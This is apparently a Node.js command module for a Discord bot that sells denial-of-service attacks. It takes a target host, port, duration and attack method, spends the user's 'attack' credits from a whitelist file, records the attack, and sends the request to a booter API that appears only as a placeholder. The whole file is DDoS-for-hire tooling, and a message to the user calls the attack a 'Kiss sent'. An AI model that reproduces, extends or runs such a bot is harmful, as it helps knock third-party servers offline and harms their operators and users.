const fetch = require('request');
const fs = require('fs');
exports.run = (client, message, args) => {
    var seks = require("../fivem");
	var whitelisted = false


	if ( message.channel.id == '1058484811171373056') { 
	}else if (message.channel.id == '1012405147504230440'){
	}else {
		return seks.embed('This command can only be used in a private channel')
	}

	if (args[0] || args[1] || args[2] || args[3]) {
	}else{  
	  return seks.embed('[host] [port] [time] [method]');
	}   
    let host = args[0]
    let port = args[1]
    let time = args[2]
    let method = args[3]
	
	if (time > 30) { 
		return seks.embed("Max time is 30sec !")
	}

	fs.readFile('whitelisted.json', (err, data) => {
		if (err) throw err;
		let Whitelist = JSON.parse(data)
		for (let i = 0; i < Whitelist.length; i++) {
			console.log(i)
			if (Whitelist[i].discord == message.author.id) { 
				if (Whitelist[i].attacks < 1) { 
					seks.embed("You do not have credits")
					return
				}
				
				Whitelist[i].attacks = Whitelist[i].attacks - 1

				fs.writeFile("whitelisted.json", JSON.stringify(Whitelist), (err) => {
                    if (err) console.log(err);
                });

				UdarajMali()
			}
	 	}
	});

function UdarajMali() { 
	fs.readFile('attacks.json', (err, data) => {
		let Tabela = JSON.parse(data);

		for (let i = 0; i<Tabela.length; i++) { 
			if (Tabela[i].attacker == message.author.id) { 
			   seks.embed('You are already attacking');
			   return
			}
		}

		var today = new Date();

		var timer = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();

		Tabela.push({
			attacker : message.author.id,
			host : host,
			time : timer,
			port : port,
			method : method
		})

		fs.writeFile('attacks.json', JSON.stringify(Tabela), (err) => {
			if (err) throw err;
		});

		ddos(host,port,time,method);
    	seks.embed('**Fun Started**\nKiss sent by : <@' + message.author.id + '>\nAddress: ** ||' + host + '||**\nPort : **' + port + '**\nMethod : **' + method + '**\nTime : **' + time + '**')
	})
	setTimeout(function() {
		fs.readFile('attacks.json', (err, data) => {
			let tejbl = JSON.parse(data);
			for (let i = 0; i < tejbl.length; i++) { 
			  if (tejbl[i].attacker == message.author.id) {
				tejbl[i] = {};
				fs.writeFile('attacks.json', JSON.stringify(tejbl), (err) => {
				  if (err) throw err;
				});
			  }
			}
		});
	}, time * 1000);
 };
}  
async function ddos(host, port, time, method){
    let api = 'APILINKPLUSAPIMANAGMENT&host=' + host + '&port=' + port + '&time=' + time + '&method=' + method
    await fetch(api)
}
